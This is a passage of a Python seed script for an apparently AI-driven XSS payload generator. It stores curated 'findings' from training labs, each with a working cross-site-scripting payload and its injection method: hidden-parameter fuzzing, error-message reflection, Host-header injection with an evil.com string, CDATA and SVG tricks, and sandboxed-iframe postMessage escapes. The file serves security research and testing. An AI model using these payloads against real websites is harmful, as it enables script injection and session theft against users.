    # Technique: discover hidden parameters / endpoints, inject via them
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="reflected_param",
        context_type="hidden_parameter",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="html-attribute-breakout",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "Fuzz hidden/undocumented parameters: debug=, callback=, redirect=, "
            "next=, url=, return_to=, ref=, source=, format=, layout=, template=. "
            "Try each with <img src=x onerror=alert(1)> and look for reflection."
        ),
        model="curated",
        explanation=(
            "Parameters that are undocumented or hidden in the UI are often "
            "forgotten during security review and lack proper sanitisation. "
            "Common hidden params: debug, format, callback, redirect, ref, source, "
            "layout. Fuzz with a short XSS payload to find reflections."
        ),
        tags=["hidden-param", "fuzzing", "adept", "xssy:1068"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_param",
        context_type="hidden_parameter",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>\"=/().",
        bypass_family="html-attribute-breakout",
        payload="</script><script>alert(1)</script>",
        test_vector=(
            "Check JS files and source maps for parameter names not present in the UI. "
            "Try path segments: /api/endpoint/<payload>, /v1/action?hidden_param=<payload>"
        ),
        model="curated",
        explanation=(
            "JS source files and source maps often reveal internal parameter names. "
            "If such a parameter is reflected inside a <script> block without encoding, "
            "a </script> breakout executes new JS."
        ),
        tags=["hidden-param", "js-breakout", "source-map", "adept", "xssy:1068"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Error Message XSS  (id=1247)
    # Technique: XSS reflected inside error/validation messages
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="error_message",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()'\n",
        bypass_family="html-attribute-breakout",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "Submit invalid input where the value is echoed in the error message: "
            "username=<img src=x onerror=alert(1)> → 'Invalid username: <img...>'"
        ),
        model="curated",
        explanation=(
            "Error messages that echo back user input are a very common XSS vector. "
            "The value is often passed through a different code path than the main "
            "form handler, missing sanitisation. Try all user-visible inputs with "
            "the payload as the value."
        ),
        tags=["error-message", "reflection", "adept", "xssy:1247"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="error_message",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789\"=/().",
        bypass_family="html-attribute-breakout",
        payload="\"><img src=x onerror=alert(1)>",
        test_vector=(
            "If the error message is: <p class=\"error\">Invalid: USER_INPUT</p>, "
            "inject \"> to break out of the attribute or element context."
        ),
        model="curated",
        explanation=(
            "When user input is embedded inside an HTML attribute in the error message "
            "(e.g., value=\"USER_INPUT\" or title=\"USER_INPUT\"), a double-quote "
            "breaks out of the attribute and the following > closes the tag, "
            "allowing injection of arbitrary HTML."
        ),
        tags=["error-message", "attribute-breakout", "adept", "xssy:1247"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Host Header XSS  (id=1318)
    # Technique: Host / X-Forwarded-Host header reflected unsanitised
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="host_header_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz().",
        bypass_family="host-header-injection",
        payload="<img src=x onerror=alert(1)>.evil.com",
        test_vector=(
            "Send request with: Host: <img src=x onerror=alert(1)>.evil.com "
            "If Host header is reflected into <link href>, <form action>, "
            "canonical URL, or password reset link — XSS fires."
        ),
        model="curated",
        explanation=(
            "Applications that use $_SERVER['HTTP_HOST'] or request.host for "
            "constructing URLs without validation reflect the attacker-controlled "
            "Host header. Common locations: password reset emails, canonical tags, "
            "CSRF tokens, redirect URLs."
        ),
        tags=["host-header", "adept", "xssy:1318"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="host_header_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz(). ",
        bypass_family="host-header-injection",
        payload="legitimate.com\" onmouseover=\"alert(1)",
        test_vector=(
            "Send: X-Forwarded-Host: legitimate.com\" onmouseover=\"alert(1) "
            "If X-Forwarded-Host is reflected in an HTML attribute, the quote breaks out."
        ),
        model="curated",
        explanation=(
            "X-Forwarded-Host is trusted by many frameworks as the 'real' hostname "
            "behind a proxy. When reflected into an HTML attribute without encoding, "
            "a quote injection creates an event handler attribute."
        ),
        tags=["host-header", "x-forwarded-host", "adept", "xssy:1318"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: XML XSS  (id=1356)
    # Technique: XSS in XML/SVG context — CDATA, namespace tricks
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="xml_body",
        context_type="xml_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()[]!",
        bypass_family="xml-cdata-injection",
        payload="<![CDATA[<script>alert(1)</script>]]>",
        test_vector=(
            "Inject into an XML field that is later rendered as HTML. "
            "CDATA section hides the script from XML parsers but browser "
            "HTML parser may execute it."
        ),
        model="curated",
        explanation=(
            "CDATA sections in XML treat content as raw character data, not markup. "
            "When XML is later deserialized and injected into innerHTML, the CDATA "
            "wrapper is stripped and the inner <script> executes. "
            "XML parsers see it as safe; HTML parsers do not."
        ),
        tags=["xml", "cdata", "adept", "xssy:1356"],
        verified=True,
    ),
    Finding(
        sink_type="svg_body",
        context_type="xml_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="svg-namespace",
        payload="<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        test_vector=(
            "Inject into XML response that is rendered as SVG in the browser, "
            "or into an endpoint that returns XML with application/xml content-type "
            "that the browser displays inline."
        ),
        model="curated",
        explanation=(
            "SVG is valid XML. A <script> inside an SVG document executes when the "
            "SVG is rendered by the browser. If the application returns user-controlled "
            "XML with an SVG namespace, injecting a script element executes JS."
        ),
        tags=["xml", "svg", "namespace", "adept", "xssy:1356"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Sandcastles  (id=772)
    # Technique: sandbox iframe escape / postMessage across sandbox boundary
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="iframe_sandbox",
        context_type="sandboxed_iframe",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="srcdoc-injection",
        payload="<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>alert(document.domain)</script>\">",
        test_vector=(
            "Inject when the outer page allows iframe injection. "
            "sandbox=allow-scripts permits JS execution; "
            "srcdoc delivers the payload without needing a URL."
        ),
        model="curated",
        explanation=(
            "An iframe with sandbox=allow-scripts can execute JS even without "
            "allow-same-origin, but it runs in the null origin. If the goal is just "
            "to trigger alert() this suffices. srcdoc bypasses URL-based allow-lists "
            "since no src URL is checked."
        ),
        tags=["sandbox", "iframe", "srcdoc", "adept", "xssy:772"],
        verified=True,
    ),
    Finding(
        sink_type="postmessage_parent",
        context_type="sandboxed_iframe",
        surviving_chars="abcdefghijklmnopqrstuvwxyz().'\"{}",
        bypass_family="postmessage-injection",
        payload="parent.postMessage('<img src=x onerror=alert(1)>', '*')",
        test_vector=(
            "Run inside a sandboxed iframe with allow-scripts. "
            "If parent page listens for messages and passes them to innerHTML, "
            "XSS fires in the parent (non-sandboxed) context."
        ),
        model="curated",
        explanation=(
            "A sandbox restricts what the iframe can do directly, but allow-scripts "
            "permits postMessage calls to the parent. If the parent has a vulnerable "
            "message listener, the sandbox can be used as a launchpad to XSS "
            "the parent page, which may have higher privileges."
        ),
        tags=["sandbox", "postmessage", "parent-xss", "adept", "xssy:772"],
        verified=True,
    ),
]


# ---------------------------------------------------------------------------
# Seed runner
# ---------------------------------------------------------------------------

def main() -> int:
    header("\n=== axss-learn: seeding Adept lab knowledge ===\n")
    info(f"Writing {len(ADEPT_FINDINGS)} curated findings to ~/.axss/findings/")
    print()

    saved = 0
    skipped = 0
    for f in ADEPT_FINDINGS:
        try:
            before_count = _count_partition(f.context_type)
            save_finding(f)
            after_count = _count_partition(f.context_type)
            if after_count > before_count:
                saved += 1
                info(f"  + [{f.bypass_family:<28}]  {f.payload[:60]}")
            else:
                skipped += 1
        except Exception as exc:
            warn(f"  ! Failed to save finding: {exc}")

    print()
    success(f"Done. {saved} new findings saved, {skipped} already existed.")
    info(
        "Run 'python axss_learn.py --min-rating 2 --max-rating 2' to now "
        "generate payloads — the model will use these as few-shot examples."
    )
    return 0


def _count_partition(context_type: str) -> int:
    from ai_xss_generator.findings import count_findings
    return count_findings(context_type)


if __name__ == "__main__":
    raise SystemExit(main())
